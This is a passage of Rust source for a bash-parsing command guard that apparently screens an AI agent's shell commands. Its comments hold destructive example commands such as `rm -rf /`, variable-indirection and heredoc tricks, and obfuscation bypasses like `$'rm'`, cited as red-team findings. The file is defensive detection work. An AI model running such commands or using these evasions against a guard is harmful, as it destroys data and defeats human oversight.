//! Tree-sitter-bash backed parser for the guard phase.
//!
//! Target: replace the per-rule shell-words boilerplate with a single
//! parse-once pipeline. The flow is:
//!
//! ```text
//! raw bash → tree-sitter AST → span classify → wrapper unwrap
//!            → flat Vec<EffectiveCommand> with argv/cwd/span/wrappers
//!            → predicate rules over EffectiveCommand
//!            → aggregate verdict
//! ```
//!
//! This module owns the first three steps. Rules in [`crate::rules`]
//! consume the resulting [`EffectiveCommand`] stream as pure predicates.

use std::collections::HashMap;

use tree_sitter::{Node, Parser, Tree};

/// Where in the source a chunk of text actually executes vs. is data.
/// Heredoc bodies, single-quoted strings, and command-message arguments
/// (`git commit -m "..."`) are NOT executable; rules must not fire on
/// content found inside Data spans.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum SpanKind {
    /// A top-level command (`CallExpression`) or a stage of a pipeline /
    /// subshell / command substitution. Rules apply.
    Executed,
    /// String literal, heredoc body, comment text. Rules do NOT apply.
    Data,
}

/// Tag describing the outermost wrapper a command was nested under.
/// Rules barely look at the specific wrapper kind — the discriminating
/// information (`remote`, `chrooted`) is already on `EffectiveCommand`
/// directly. The 25-variant enum we used to carry was a port from
/// bash-guard's taxonomy; six categories are enough to attribute the
/// chain in telemetry.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Wrapper {
    /// `sudo`, `doas` — privilege escalation, no semantic effect on
    /// classification beyond traceability.
    Sudo,
    /// `env`, `command`, `builtin`, `exec`, `timeout`, `nohup`, `time`,
    /// `nice`, `ionice`, `setsid`, `flock`, `busybox` — pass-through
    /// wrappers that don't change the inner command's meaning.
    PassThrough,
    /// `bash -c "..."`, `sh -c`, `zsh -c`, `ksh -c`, `dash -c`,
    /// `eval` — bodies are re-parsed as bash.
    Shell,
    /// `xargs <cmd>`, `parallel`, `watch` — inner command runs with
    /// argv extended by piped input (unknown at parse time).
    StdinArgs,
    /// `find ... -delete` (synthesized rm) and `find ... -exec cmd`.
    Find,
    /// `ssh host cmd` — inner command runs on a remote host. Marks
    /// `EffectiveCommand.remote = true`.
    Ssh,
    /// `chroot /path cmd` — marks `EffectiveCommand.chrooted = true`.
    Chroot,
}

/// One executable command after wrapper unwrapping. `argv[0]` is the
/// command name; `argv[1..]` are its arguments. `cwd` is propagated from
/// preceding `cd <abspath>` segments in the same compound command. The
/// `wrappers` chain records every wrapper this command sat inside, in
/// outer-to-inner order. `remote` and `chrooted` are short-cuts that
/// disable the local-safe-paths allowlist (an `rm -rf /tmp/foo` inside
/// `ssh remote` deletes a file on a different machine).
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct EffectiveCommand {
    pub argv: Vec<String>,
    pub cwd: Option<String>,
    pub span: SpanKind,
    pub wrappers: Vec<Wrapper>,
    pub remote: bool,
    pub chrooted: bool,
}

impl EffectiveCommand {
    pub fn head(&self) -> Option<&str> {
        self.argv.first().map(String::as_str)
    }

    pub fn args(&self) -> &[String] {
        if self.argv.is_empty() {
            &[]
        } else {
            &self.argv[1..]
        }
    }
}

/// Result of a parse: the flat list of effective commands the source
/// would execute, plus a `had_error` flag set when tree-sitter saw
/// ERROR/MISSING nodes (or failed to produce a tree at all). Callers
/// use the flag to drive the asymmetric fail-open decision in
/// [`crate::lib::check_detailed`].
#[derive(Debug)]
pub struct ParseResult {
    pub commands: Vec<EffectiveCommand>,
    pub had_error: bool,
}

/// Parse a raw bash command. Always returns a list of commands (possibly
/// empty) and a flag indicating whether the parse hit any error nodes.
pub fn parse(source: &str) -> ParseResult {
    let mut parser = Parser::new();
    if parser
        .set_language(&tree_sitter_bash::LANGUAGE.into())
        .is_err()
    {
        return ParseResult {
            commands: Vec::new(),
            had_error: true,
        };
    }
    let Some(tree) = parser.parse(source, None) else {
        return ParseResult {
            commands: Vec::new(),
            had_error: true,
        };
    };

    let bytes = source.as_bytes();
    let mut walker = Walker::new(bytes);
    walker.walk_program(tree.root_node());

    ParseResult {
        commands: walker.commands,
        had_error: tree_has_error(&tree),
    }
}

fn tree_has_error(tree: &Tree) -> bool {
    fn walk(node: Node<'_>) -> bool {
        if node.is_error() || node.is_missing() {
            return true;
        }
        let mut cursor = node.walk();
        let children: Vec<Node<'_>> = node.children(&mut cursor).collect();
        children.into_iter().any(walk)
    }
    walk(tree.root_node())
}

struct Walker<'a> {
    src: &'a [u8],
    commands: Vec<EffectiveCommand>,
    /// Lexical cwd accumulated as we walk a compound (`cd /tmp && rm -rf
    /// x` → cwd=/tmp when we get to rm). Reset on subshell boundary
    /// because `(cd /tmp); rm` does NOT inherit /tmp on the second leg.
    cwd: Option<String>,
    /// Lexical variable bindings captured from top-level assignments
    /// (`a="rm -rf /"`). Used to resolve `$a` indirection in command
    /// position and inside `bash -c "$a"` bodies. Without this the AST
    /// flow leaves `$a` opaque and rules silently allow the destruction.
    /// Subshell save/restore mirrors `cwd` because `(a=...)` does not
    /// leak the binding outside.
    bindings: HashMap<String, String>,
}

/// Names we trust to resolve from process env at parse time.
///
/// Per decision.guard-indirection-hardening, `bounded_envvar_trust`:
/// keeping this set small and known-interactive is the price for not
/// flagging every legit `$EDITOR file` / `${HOME}/cache`. Shell-set
/// values for these names override via the same lexical-bindings path
/// any other variable uses — so an agent doing `HOME=/; rm -rf $HOME`
/// rebinds `HOME` in the lexical scope, NOT in this allowlist. The
/// allowlist is only consulted when the lexical binding is absent.
const TRUSTED_ENV_NAMES: &[&str] = &[
    "HOME", "PWD", "EDITOR", "PAGER", "VISUAL", "BROWSER", "SHELL",
];

impl<'a> Walker<'a> {
    fn new(src: &'a [u8]) -> Self {
        Self {
            src,
            commands: Vec::new(),
            cwd: None,
            bindings: HashMap::new(),
        }
    }

    /// Resolve a variable name. Lexical bindings win over process env.
    /// Process env only consulted for names in `TRUSTED_ENV_NAMES` —
    /// otherwise the agent could rely on whatever junk happens to be
    /// in env at guard-time (e.g. `LD_PRELOAD`, `PATH`, custom names).
    /// `__TAINTED_OPAQUE__` is the sentinel for refused-but-shadowed
    /// trusted-env names; treating it as an unresolvable miss prevents
    /// the env-fallback bypass.
    fn lookup(&self, name: &str) -> Option<String> {
        if let Some(v) = self.bindings.get(name) {
            if v == "__TAINTED_OPAQUE__" {
                return None;
            }
            return Some(v.clone());
        }
        if TRUSTED_ENV_NAMES.contains(&name) {
            if let Ok(v) = std::env::var(name) {
                return Some(v);
            }
        }
        None
    }

    fn text(&self, node: Node<'_>) -> &'a str {
        node.utf8_text(self.src).unwrap_or("")
    }

    /// Top-level walk: a `program` node has any number of child
    /// statements separated by newlines/`;`/`&`. Compound bodies inherit
    /// our cwd state, but a subshell saves/restores it.
    fn walk_program(&mut self, node: Node<'_>) {
        let mut cursor = node.walk();
        let children: Vec<Node<'_>> = node.named_children(&mut cursor).collect();
        for child in children {
            self.walk_node(child, &[], false, false);
        }
    }

    fn walk_node(&mut self, node: Node<'_>, wrappers: &[Wrapper], remote: bool, chrooted: bool) {
        match node.kind() {
            "command" => {
                self.handle_command(node, wrappers, remote, chrooted);
            }
            "pipeline" => {
                self.handle_pipeline(node, wrappers, remote, chrooted);
            }
            "redirected_statement" => {
                // `bash <<EOF\nrm -rf /\nEOF` arrives as
                // redirected_statement { command, heredoc_redirect }.
                // The heredoc body is a sibling of command, NOT inside
                // it — so handle_command's child-only scan misses it.
                // Collect any sibling redirect bodies and pass them
                // into the command via a synthetic `-c BODY` injection.
                self.handle_redirected_statement(node, wrappers, remote, chrooted);
            }
            "subshell"
            | "command_substitution"
            | "process_substitution"
            | "function_definition" => {
                // All four create a new shell scope in real bash:
                //   * `(...)`: subshell with isolated vars + cwd.
                //   * `$(...)` / `<(...)`: command/process substitution
                //     runs in a subshell; assignments don't leak.
                //   * function bodies: assignments are global by
                //     default in bash, but they only EXECUTE on call.
                //     At parse time we don't know if `f` will ever
                //     run, and capturing the binding now poisons the
                //     outer scope. Treat the body as isolated for
                //     binding-capture purposes — pessimistic for
                //     functions that DO get called, but conservative
                //     for the more common no-call-yet case. (We also
                //     still walk children so commands inside the body
                //     surface for rule classification.)
                let saved_cwd = self.cwd.clone();
                let saved_bindings = self.bindings.clone();
                self.walk_named_children(node, wrappers, remote, chrooted);
                self.cwd = saved_cwd;
                self.bindings = saved_bindings;
            }
            "variable_assignment" => {
                // Top-level assignment (`a="rm -rf /"`) — record the
                // binding so a later `$a` in command position can be
                // resolved. Without this we leave `$a` opaque and
                // rules silently allow `a="rm /"; $a`.
                //
                // Tainted env shadow: an assignment to a TRUSTED_ENV
                // name with an opaque (refused) RHS still SHADOWS the
                // process env in real bash, so a later `$HOME` looks
                // up the new (opaque) value, not the original env.
                // Without recording a tainted sentinel, `lookup`
                // would fall through to `std::env::var(HOME)` and
                // silently use the pristine env — bypass per
                // tribunal v2 (Codex finding 4). Record `__TAINTED__`
                // so `lookup` returns None and the envelope routes
                // to the unresolved marker.
                let raw = self.text(node);
                if let Some((name, value)) = parse_assignment(raw) {
                    self.bindings.insert(name, value);
                } else if let Some((name, _)) = static_assignment_name(raw) {
                    if TRUSTED_ENV_NAMES.contains(&name.as_str()) {
                        self.bindings.insert(name, "__TAINTED_OPAQUE__".to_string());
                    }
                }
            }
            // Heredocs and comments are pure data — never executable.
            "heredoc_redirect" | "comment" => {}
            // String nodes ARE data overall (their text content is not
            // executed) but they may CONTAIN command substitutions
            // (`"$(rm -rf /)"`) that DO execute before the outer
            // command. Descend into named children so substitutions
            // get walked; pure string content (string_content) has no
            // named-child structure and yields nothing.
            "string" | "raw_string" => {
                self.walk_named_children(node, wrappers, remote, chrooted);
            }
            _ => {
                // For lists, compound statements, control flow,
                // command substitution, process substitution, and any
                // other container node, just descend into named
                // children.
                self.walk_named_children(node, wrappers, remote, chrooted);
            }
        }
    }

    /// Handle a pipeline node. Each stage is walked normally so its
    /// rules fire; additionally, when the LAST stage is a shell binary
    /// running input (no `-c`) we recognise pipe-to-shell shape:
    ///
    ///   * Upstream stage with a literal string body (`echo "rm -rf /"`,
    ///     `printf "..."`) → re-parse the literal as bash and push the
    ///     resulting commands tagged with ShC/BashC wrappers.
    ///   * Upstream stage that fetches a script (`curl URL`,
    ///     `wget URL`) → push a synthetic `__pipe_to_shell__` marker
    ///     command so the [`rule_pipe_to_shell`] predicate fires.
    fn handle_pipeline(
        &mut self,
        node: Node<'_>,
        wrappers: &[Wrapper],
        remote: bool,
        chrooted: bool,
    ) {
        // Collect stages first so we can inspect the last one before
        // we walk them in order.
        let mut cursor = node.walk();
        let stages: Vec<Node<'_>> = node.named_children(&mut cursor).collect();

        // Walk each stage normally — preserves per-stage rule firing.
        for &stage in &stages {
            self.walk_node(stage, wrappers, remote, chrooted);
        }

        // Pipe-to-shell shape detection runs AFTER walking so the
        // synthetic marker doesn't interfere with the per-stage walk.
        let Some(last) = stages.last() else { return };
        let last_argv = self.command_argv(*last);
        let last_is_shell = matches!(
            last_argv.first().map(String::as_str),
            Some("bash" | "sh" | "zsh" | "ksh" | "dash")
        );
        let last_has_dash_c = last_argv.iter().any(|t| t == "-c");
        if !last_is_shell || last_has_dash_c {
            return;
        }

        for &upstream in &stages[..stages.len() - 1] {
            let argv = self.command_argv(upstream);
            let head = argv.first().map(String::as_str);
            match head {
                Some("echo" | "printf") => {
                    // Re-parse each literal string arg as bash. This
                    // catches `echo "rm -rf /" | bash`.
                    for arg in &argv[1..] {
                        if !looks_like_literal(arg) {
                            continue;
                        }
                        let body = strip_outer_quotes(arg);
                        for mut cmd in parse(body).commands {
                            let mut chain = wrappers.to_vec();
                            chain.push(Wrapper::Shell);
                            chain.extend(cmd.wrappers.into_iter());
                            cmd.wrappers = chain;
                            if cmd.cwd.is_none() {
                                cmd.cwd = self.cwd.clone();
                            }
                            self.commands.push(cmd);
                        }
                    }
                }
                Some("curl" | "wget") => {
                    // Non-literal upstream — we can't see the script
                    // body. Push a synthetic marker for the predicate.
                    let url = argv
                        .iter()
                        .find(|t| t.starts_with("http://") || t.starts_with("https://"))
                        .cloned()
                        .unwrap_or_default();
                    self.commands.push(EffectiveCommand {
                        argv: vec!["__pipe_to_shell__".to_string(), url],
                        cwd: self.cwd.clone(),
                        span: SpanKind::Executed,
                        wrappers: wrappers.to_vec(),
                        remote,
                        chrooted,
                    });
                }
                _ => {
                    // Other upstream: defer. Could be `cat file | bash`
                    // (file content unknown) or `grep ... | bash` (also
                    // unknown). Conservative behaviour: do nothing
                    // here; the per-stage walk already classified each
                    // command.
                }
            }
        }
    }

    /// Read a single `command` node's argv tokens without firing
    /// handle_command's full pipeline. Used by pipe-to-shell shape
    /// inspection where we just need to peek at argv[0].
    fn command_argv(&self, node: Node<'_>) -> Vec<String> {
        if node.kind() != "command" {
            return Vec::new();
        }
        let mut argv = Vec::new();
        let mut cursor = node.walk();
        for child in node.named_children(&mut cursor) {
            match child.kind() {
                "command_name" | "word" | "concatenation" | "number" => {
                    argv.push(self.text(child).to_string());
                }
                "string" | "raw_string" => {
                    argv.push(self.text(child).to_string());
                }
                "simple_expansion" | "expansion" => {
                    argv.push(self.text(child).to_string());
                }
                _ => {}
            }
        }
        argv
    }

    fn walk_named_children(
        &mut self,
        node: Node<'_>,
        wrappers: &[Wrapper],
        remote: bool,
        chrooted: bool,
    ) {
        let mut cursor = node.walk();
        let children: Vec<Node<'_>> = node.named_children(&mut cursor).collect();
        for child in children {
            self.walk_node(child, wrappers, remote, chrooted);
        }
    }

    /// Resolve a textual fragment by substituting `$NAME` and `${NAME}`
    /// references against `self.bindings`. Returns `Some(expanded)` when
    /// every reference resolves; returns `None` if any reference is
    /// missing, dynamic (`$(...)`, `` `...` ``), parametric
    /// (`${NAME:-default}`), or positional (`$1`, `$@`, `$$`). The None
    /// case is what flips an indirect command to the
    /// `__indirect_unresolved__` marker — silent expansion of an unknown
    /// var is the bypass we are closing.
    fn expand_vars(&self, text: &str) -> Option<String> {
        let mut out = String::new();
        let mut chars = text.chars().peekable();
        while let Some(c) = chars.next() {
            // Backtick command substitution is dynamic at any position.
            // Without this guard the envelope's re-parse loop sees the
            // same backtick text on the next iteration and recurses
            // until the stack overflows. (Verified: `\`rm -rf /\``
            // would hang with stack overflow before this branch.)
            if c == '`' {
                return None;
            }
            if c != '$' {
                out.push(c);
                continue;
            }
            // Bare `$` at end of string — leave literal.
            let Some(&next) = chars.peek() else {
                out.push('$');
                continue;
            };
            // `$(cmd)` and backticks are dynamic — refuse.
            if next == '(' || next == '`' {
                return None;
            }
            // `${NAME}` — only plain names; refuse parameter expansion ops.
            if next == '{' {
                chars.next();
                let mut name = String::new();
                let mut closed = false;
                for ch in chars.by_ref() {
                    if ch == '}' {
                        closed = true;
                        break;
                    }
                    if ch == '_' || ch.is_ascii_alphanumeric() {
                        name.push(ch);
                    } else {
                        return None;
                    }
                }
                if !closed || name.is_empty() {
                    return None;
                }
                let value = self.lookup(&name)?;
                out.push_str(&value);
                continue;
            }
            // `$NAME` — alphanum/underscore, leading non-digit.
            if next == '_' || next.is_ascii_alphabetic() {
                let mut name = String::new();
                while let Some(&ch) = chars.peek() {
                    if ch == '_' || ch.is_ascii_alphanumeric() {
                        name.push(ch);
                        chars.next();
                    } else {
                        break;
                    }
                }
                let value = self.lookup(&name)?;
                out.push_str(&value);
                continue;
            }
            // `$1`, `$@`, `$?`, `$$`, `$*`, `$#` — positional/special params.
            // We don't track them; treat as unresolvable.
            return None;
        }
        Some(out)
    }

    /// Process `bash <<EOF…EOF` and friends. Tree-sitter wraps the
    /// command + redirect pair as `redirected_statement` with the
    /// command and one or more redirect nodes as siblings. If the
    /// inner command's head is a shell and there is a heredoc body,
    /// process_substitution, or here-string body attached, we re-route
    /// the work as if the body were a `-c BODY` argument so the
    /// existing wrapper logic handles bindings, expansion, and the
    /// indirect-unresolved marker uniformly.
    fn handle_redirected_statement(
        &mut self,
        node: Node<'_>,
        wrappers: &[Wrapper],
        remote: bool,
        chrooted: bool,
    ) {
        let mut cursor = node.walk();
        let kids: Vec<Node<'_>> = node.named_children(&mut cursor).collect();
        let command = kids.iter().find(|c| c.kind() == "command").copied();
        let Some(cmd_node) = command else {
            // Not a recognizable shape — fall back to walking children.
            self.walk_named_children(node, wrappers, remote, chrooted);
            return;
        };
        // Determine the command head — needed to decide if we should
        // splice a synthetic `-c body`. Cheap argv peek via command_argv.
        let head_argv = self.command_argv(cmd_node);
        let is_shell = matches!(
            head_argv.first().map(String::as_str),
            Some("bash" | "sh" | "zsh" | "ksh" | "dash")
        );
        if !is_shell || head_argv.iter().any(|t| t == "-c") {
            // Either not a shell, or already has -c — handle the
            // command normally. The sibling redirects are I/O that
            // doesn't change classification semantics for non-shell
            // commands (`grep < file`).
            self.handle_command(cmd_node, wrappers, remote, chrooted);
            return;
        }
        // Look for a script-providing redirect.
        let mut script: Option<String> = None;
        for k in &kids {
            match k.kind() {
                "heredoc_redirect" => {
                    let mut cur = k.walk();
                    let mut body = String::new();
                    for inner in k.named_children(&mut cur) {
                        if inner.kind() == "heredoc_body" {
                            body.push_str(self.text(inner));
                        }
                    }
                    if !body.is_empty() {
                        script = Some(body);
                    } else {
                        script = Some("$__heredoc_unknown__".to_string());
                    }
                }
                "herestring_redirect" => {
                    let mut cur = k.walk();
                    for inner in k.named_children(&mut cur) {
                        script = Some(unquote(self.text(inner)));
                        break;
                    }
                }
                "process_substitution" => {
                    script = Some("$__procsub_unknown__".to_string());
                }
                _ => {}
            }
        }
        if let Some(body) = script {
            // Synthesize an argv `bash -c BODY` and route it through
            // the same path as a literal `bash -c …` invocation.
            // We can't mutate the tree-sitter node, so build a fake
            // EffectiveCommand stream by directly invoking the wrapper
            // re-parse logic via a synthetic call. Cheapest path:
            // re-parse `bash -c '...body...'` as a fresh source.
            // The body might contain quotes; we route the bytes
            // through expand_vars first to preserve bindings.
            let body_to_parse = self.expand_vars(&body).unwrap_or_else(|| {
                // Body has unresolved expansion — emit marker directly.
                self.commands.push(EffectiveCommand {
                    argv: vec![
                        "__indirect_unresolved__".to_string(),
                        format!("shell stdin: {body}"),
                    ],
                    cwd: self.cwd.clone(),
                    span: SpanKind::Executed,
                    wrappers: wrappers.to_vec(),
                    remote,
                    chrooted,
                });
                String::new()
            });
            if !body_to_parse.is_empty() {
                let inner = parse(&body_to_parse).commands;
                for mut cmd in inner {
                    let mut chain = wrappers.to_vec();
                    chain.push(Wrapper::Shell);
                    chain.extend(cmd.wrappers.into_iter());
                    cmd.wrappers = chain;
                    cmd.remote = cmd.remote || remote;
                    cmd.chrooted = cmd.chrooted || chrooted;
                    if cmd.cwd.is_none() {
                        cmd.cwd = self.cwd.clone();
                    }
                    self.commands.push(cmd);
                }
            }
            return;
        }
        // No script-providing redirect; classify the command normally.
        self.handle_command(cmd_node, wrappers, remote, chrooted);
    }

    fn handle_command(
        &mut self,
        node: Node<'_>,
        wrappers: &[Wrapper],
        remote: bool,
        chrooted: bool,
    ) {
        let mut argv: Vec<String> = Vec::new();
        let mut cursor = node.walk();
        let children: Vec<Node<'_>> = node.named_children(&mut cursor).collect();
        // First pass: walk any nested command/process substitutions so
        // their inner commands surface as separate executable nodes.
        // `echo $(rm -rf /etc)` and `echo "$(rm -rf /etc)"` both
        // contain a destructive `rm` that runs before the outer echo
        // and must therefore be classified independently.
        for child in &children {
            match child.kind() {
                "command_substitution" | "process_substitution" => {
                    self.walk_named_children(*child, wrappers, remote, chrooted);
                }
                "string" | "raw_string" | "concatenation" => {
                    // Substitutions can nest inside string content
                    // (`"$(rm -rf /)"`) or in concatenated tokens
                    // (`pre$(rm)post`). Descend to surface them.
                    self.walk_named_children(*child, wrappers, remote, chrooted);
                }
                _ => {}
            }
        }
        // Second pass: collect argv tokens for the outer command.
        for child in &children {
            match child.kind() {
                "command_name" | "word" | "concatenation" | "number" => {
                    // decode_token handles ANSI-C `$'X'` and unquoted
                    // backslash escapes so the rules layer sees the
                    // bash-literal head, not the obfuscated source
                    // text (`$'rm'` and `\r\m` both → `rm`).
                    argv.push(decode_token(self.text(*child)));
                }
                "string" | "raw_string" => {
                    // Strip outer quotes; tree-sitter keeps them in
                    // the source text, so `'foo'` and `"foo"` both
                    // arrive with the surrounding marks.
                    argv.push(unquote(self.text(*child)));
                }
                "variable_assignment" => {
                    // Skip leading env-vars for command-name lookup;
                    // record nothing (real shells set them in env).
                }
                "simple_expansion" | "expansion" => {
                    argv.push(self.text(*child).to_string());
                }
                "command_substitution" => {
                    // `$(echo rm) -rf /` — substitution as command head
                    // surfaces here. We push the raw text so the
                    // envelope (`contains_var_ref`) sees `$(`. The
                    // first pass already walked the substitution
                    // children to surface the inner command separately.
                    argv.push(self.text(*child).to_string());
                }
                "process_substitution" => {
                    // `source <(...)`, `cmd >(...)` — push raw text so
                    // the source/eval wrappers can see the indirect
                    // argument and emit the marker. The first-pass
                    // walk into command_substitution doesn't apply
                    // here (process_substitution children are NOT
                    // command_substitution), but since this only
                    // matters for source/. — which we treat as
                    // wholly indirect anyway — we don't need to
                    // surface the inner command separately.
                    argv.push(self.text(*child).to_string());
                }
                _ => {}
            }
        }

        // Shell stdin/script-input detection: `bash <<< BODY`,
        // `bash <<EOF…EOF`, `bash <(cmd)`, and `bash -s <<EOF…` all
        // feed BODY to the shell as its script. Without routing,
        // these slip past as a no-op argv = ["bash"]. Tree-sitter
        // exposes them as `herestring_redirect`, `heredoc_redirect`,
        // and `process_substitution` siblings of the command.
        //
        // Strategy:
        //   * here-string with literal/expansion body → synth `-c body`
        //     so the existing bash -c path expands and re-parses.
        //   * here-doc body or process substitution → opaque from our
        //     vantage point; emit __indirect_unresolved__ via the
        //     wrapper-unwrap path (synth a `-c` with a sentinel
        //     placeholder that contains_var_ref always trips on, so
        //     expand_vars returns None and the marker fires).
        if matches!(
            argv.first().map(String::as_str),
            Some("bash" | "sh" | "zsh" | "ksh" | "dash")
        ) && !argv.iter().any(|t| t == "-c")
        {
            let mut script_input: Option<String> = None;
            for child in &children {
                match child.kind() {
                    "herestring_redirect" => {
                        let mut cur = child.walk();
                        for inner in child.named_children(&mut cur) {
                            script_input = Some(unquote(self.text(inner)));
                            break;
                        }
                    }
                    "heredoc_redirect" => {
                        // Heredoc body content is in a sibling
                        // `heredoc_body` node attached to the redirect.
                        // Tree-sitter places the body as a NAMED child
                        // of the heredoc_redirect; grab whatever text
                        // is there. If we can't find a literal body,
                        // route through the indirect-unresolved path
                        // (sentinel `$__heredoc__`) so the marker
                        // fires uniformly.
                        let mut cur = child.walk();
                        let mut body = String::new();
                        for inner in child.named_children(&mut cur) {
                            if inner.kind() == "heredoc_body" {
                                body.push_str(self.text(inner));
                            }
                        }
                        if !body.is_empty() {
                            script_input = Some(body);
                        } else {
                            script_input = Some("$__heredoc_unknown__".to_string());
                        }
                    }
                    "process_substitution" => {
                        // bash <(...) — the substitution's stdout is
                        // a /dev/fd path that bash executes as a
                        // script. We can't inspect that script
                        // statically. Route through indirect-unresolved.
                        script_input = Some("$__procsub_unknown__".to_string());
                    }
                    _ => {}
                }
            }
            if let Some(body) = script_input {
                argv.push("-c".to_string());
                argv.push(body);
            }
        }

        if argv.is_empty() {
            return;
        }

        // Built-in mutators: `read VAR…` and `printf -v VAR …` set
        // bindings dynamically from stdin/format. We can't see the
        // new value, but if a NAME was previously bound to a literal
        // (e.g. `a="ls"`) and then `read a` overrides it from stdin,
        // a later `$a` MUST NOT resolve via the stale safe value.
        // Tribunal v2 (Gemini finding 5). Clear the bindings.
        if argv[0] == "read" {
            for arg in &argv[1..] {
                if !arg.starts_with('-') && is_valid_var_name(arg) {
                    self.bindings.remove(arg);
                }
            }
        } else if argv[0] == "printf" {
            let mut iter = argv[1..].iter();
            while let Some(t) = iter.next() {
                if t == "-v" {
                    if let Some(name) = iter.next() {
                        if is_valid_var_name(name) {
                            self.bindings.remove(name);
                        }
                    }
                    break;
                }
            }
        }

        // Indirect command via variable expansion (`$a`, `${a}`).
        // Without this branch, `a="rm -rf /"; $a` leaves argv[0]="$a"
        // and rules silently allow it — verified bypass. With known
        // binding: textually expand the whole argv and re-parse so
        // bash word-splitting kicks in (`$a` unquoted with value
        // "rm -rf /" → 3 argv tokens). With unknown binding: emit a
        // synthetic `__indirect_unresolved__` marker so a rule fires
        // — guard semantics prefer false-positive ask over silent
        // allow on opaque indirection (matches the existing
        // `__eval_dynamic__` pattern for `eval "$X"`).
        if contains_var_ref(&argv[0]) {
            let joined = argv.join(" ");
            match self.expand_vars(&joined) {
                Some(expanded) if expanded != joined => {
                    let inner = parse(&expanded).commands;
                    if !inner.is_empty() {
                        for mut cmd in inner {
                            let mut chain = wrappers.to_vec();
                            chain.extend(cmd.wrappers.into_iter());
                            cmd.wrappers = chain;
                            cmd.remote = cmd.remote || remote;
                            cmd.chrooted = cmd.chrooted || chrooted;
                            if cmd.cwd.is_none() {
                                cmd.cwd = self.cwd.clone();
                            }
                            self.commands.push(cmd);
                        }
                        return;
                    }
                    // Expansion produced no parseable command (empty
                    // value, whitespace only) — fall through to the
                    // unresolved-marker path so we don't silently drop.
                }
                Some(_) | None => {
                    // Either no resolution happened (text unchanged —
                    // would loop on re-parse) or some reference was
                    // unresolvable. Fall through to marker emission.
                }
            }
            self.commands.push(EffectiveCommand {
                argv: vec!["__indirect_unresolved__".to_string(), joined],
                cwd: self.cwd.clone(),
                span: SpanKind::Executed,
                wrappers: wrappers.to_vec(),
                remote,
                chrooted,
            });
            return;
        }

        // `cd <abs>` updates lexical cwd; emit nothing for cd itself.
        // Any non-absolute target (`cd ..`, `cd subdir`, `cd -`, `cd ~`,
        // `cd $VAR`, bare `cd`) drops cwd to None — we cannot resolve
        // the new directory at parse time and a stale cwd causes false
        // safe verdicts (verified bypass: `cd /tmp; cd ..; rm -rf var`
        // checks against /tmp/var rather than /var).
        if argv[0] == "cd" {
            match argv.get(1).map(String::as_str) {
                Some(target) if target.starts_with('/') && !target.contains("..") => {
                    self.cwd = Some(target.to_string());
                }
                _ => {
                    self.cwd = None;
                }
            }
            return;
        }

        // Wrapper unwrap: peel layers of wrappers off until the inner
        // argv is no longer a wrapper or a body must be re-parsed.
        // `timeout 10 bash -c 'rm -rf /etc'` peels timeout → bash -c
        // → re-parse body. `sudo nice -n 5 rm -rf /etc` peels sudo →
        // nice → rm.
        let mut current_argv = argv;
        let mut chain: Vec<Wrapper> = wrappers.to_vec();
        let mut acc_remote = remote;
        let mut acc_chrooted = chrooted;
        loop {
            let Some((wrapper, inner, r, c, body)) = unwrap_wrapper(&current_argv) else {
                break;
            };
            chain.push(wrapper);
            acc_remote = acc_remote || r;
            acc_chrooted = acc_chrooted || c;
            if let Some(body) = body {
                // Re-parse the literal `-c BODY` payload as fresh bash.
                // Body expansion happens against the CURRENT walker's
                // bindings BEFORE the inner parse — the inner Walker
                // has empty bindings.
                //
                // Body-position injection: if the body contains ANY
                // unresolvable expansion (`bash -c "echo $a"` with `a`
                // unbound, or `eval "echo $a"` ditto), the body is
                // dangerous regardless of where the expansion lands —
                // an unresolved value can introduce command separators
                // that turn the rest of the body into new commands
                // (`a='; rm -rf /'`). Per tribunal v2 (Codex finding 3),
                // emit the marker BEFORE re-parse rather than relying
                // on argv[0] alone.
                let body_to_parse = match self.expand_vars(&body) {
                    Some(expanded) => expanded,
                    None => {
                        let mut full_chain = chain.clone();
                        self.commands.push(EffectiveCommand {
                            argv: vec!["__indirect_unresolved__".to_string(), body.clone()],
                            cwd: self.cwd.clone(),
                            span: SpanKind::Executed,
                            wrappers: full_chain.drain(..).collect(),
                            remote: acc_remote,
                            chrooted: acc_chrooted,
                        });
                        return;
                    }
                };
                let inner_cmds = parse(&body_to_parse).commands;
                if !inner_cmds.is_empty() {
                    for mut cmd in inner_cmds {
                        let mut full_chain = chain.clone();
                        full_chain.extend(cmd.wrappers.into_iter());
                        cmd.wrappers = full_chain;
                        cmd.remote = cmd.remote || acc_remote;
                        cmd.chrooted = cmd.chrooted || acc_chrooted;
                        if cmd.cwd.is_none() {
                            cmd.cwd = self.cwd.clone();
                        }
                        self.commands.push(cmd);
                    }
                    return;
                }
                // Re-parse failed completely — fall through to push the
                // wrapper command itself with the body as opaque arg.
                break;
            }
            if inner.is_empty() {
                // Wrapper had no inner command to unwrap (e.g. `sudo`
                // alone, or `ssh host` with no remote command). Stop
                // peeling; record the wrapper itself.
                return;
            }
            current_argv = inner;
        }

        self.commands.push(EffectiveCommand {
            argv: current_argv,
            cwd: self.cwd.clone(),
            span: SpanKind::Executed,
            wrappers: chain,
            remote: acc_remote,
            chrooted: acc_chrooted,
        });
    }
}

/// Decode token forms bash evaluates at parse time, so a rule
/// matching the literal string `"rm"` still fires on `$'rm'` and
/// `\r\m`. Without this an agent could obfuscate the head past the
/// rules layer:
///   `$'rm' -rf /`     →  `rm` (ANSI-C string is bash-literal)
///   `\r\m -rf /`      →  `rm` (escapes are bash-literal in unquoted text)
///   `\$EDITOR foo`    →  `\$EDITOR` is NOT decoded — the leading
///                        `\$` keeps `$` literal in bash too.
/// This is NOT indirection (no agent-controlled state involved); the
/// rules layer only knows literal strings, so we normalize before
/// rule application. Per tribunal v2 (Codex finding 6, Gemini finding 2).
fn decode_token(text: &str) -> String {
    // ANSI-C string `$'X'`: bash evaluates escape sequences inside.
    // We handle the common escape-free case (no \-sequences inside)
    // by stripping the wrapper. Sequences like `\n`, `\x41` are
    // outside scope — leave the wrapper if they're present, the
    // envelope's contains_var_ref will still see the leading `$`
    // and route via the indirect-unresolved marker.
    if let Some(inner) = text.strip_prefix("$'").and_then(|s| s.strip_suffix('\'')) {
        if !inner.contains('\\') {
            return inner.to_string();
        }
    }
    // Unquoted backslash escapes: `\X` → `X` for any `X`. Real bash
    // also drops the backslash for non-special characters; for the
    // rules layer the destination is the same. Don't touch tokens
    // that are quoted strings (handled by `unquote` separately).
    if !text.starts_with('"') && !text.starts_with('\'') && text.contains('\\') {
